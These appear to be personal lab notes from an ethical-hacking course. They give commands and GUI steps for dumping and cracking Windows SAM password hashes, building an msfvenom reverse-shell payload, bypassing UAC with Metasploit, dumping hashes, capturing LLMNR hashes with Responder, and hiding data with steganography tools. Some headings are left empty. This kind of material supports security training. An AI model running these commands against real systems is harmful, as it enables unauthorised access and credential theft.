* Dumping and cracking SAM hashes:
    - Command to display user account names and their Ids 
        > wmic useraccount get name,sid
    - Run the pnwdump command to get the password hashes of the users:
        > ./pwndump7.exe
        > save the result into a txt file (./pwndump7.exe > hashes.txt)
    - Open the ophcrack to crack the hashes:
    - Click on load and select PWNDUMP file.
    - Click on "Tables" from menu bar and select Vista free
    - For installation choose the folder where ophcrack is present.
    - Click on Crack from menu bar , this will start cracking passwords.

* Creating and using Rainbow tables:
    - To create table open winrtgen tool.
    - Click on add table > select ntlm from hash drop down > set min len 4 and max 6 > Chain count 4000000
    - Select loweraplha from charset dropdown
    - Click OK, this will create the Rainbow hash table

* Cracking the hash with rainbow attack
    - Go to rainbow crack and open rcrack_gui.exe to launch rainbow attack
    - When window appears click on File > Load NTLM Hashes from PWNDUMP file
    - Now to use the already generated rainbow table click Rainbow table > Search Rainbow tables > ntlm_loweralpha......4000000...rt
    - This will crach the hashes.

* Auditing system password using L0phtCrack:

* Exploiting Client side vulns and establishing VNC Session:
    - Create a malicious windows payload
        # msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=<ownip> LPORT=<own port> -o output payload_file_name.exe
    - Elevate privileges with metasploit:
        # getsystem -t 1
        to backgroung meterpreter session type "background"
        # use exploit/windows/local/bypassuac_fodhelper
        # show options
        # session -i 1
        # set payload windows/meterpreter/reverse_tcp
        # set lhost <own ip>
        # set Target 0
        # exploit
    - To dump hashes, type below command
        # run post/windows/gather/smart_hashdump

* Hiding data using steganography:
    - Go to steganography tools and open terminal.
    - Tyep below command 
        > snow -C -m "This is a simple text" -p "password@123" file1.txt file2.txt 
        file2.txt is the new file that will be created which will have text from file1 and it will have the secret text hidden in form of white spaces.

* Image steganography using Openstego:
    - Open Openstego tool and select the text file from "Message file" option.
    - Select image from "Cover file" option 
    - Select location and give any name for output file.
    - Click on hide data

* Viewing, Enabling & Clearing Audit policies using Auditpol:
    - Run below command to get all the windows policies:
     > auditpol /get /category:* 
     This will list out all the windows policy   
    - To enable the policy type below command:
     > auditpol /set /category:"system","account logon" /success:enable /failure:enable

* Converting channels using Convert_TCP:

* Responder:
    # responder -l eth0
    This will dump the log file (/usr/share/responder/logs) with the hash of user trying to do th LLMNR query

* Crack the password via john:
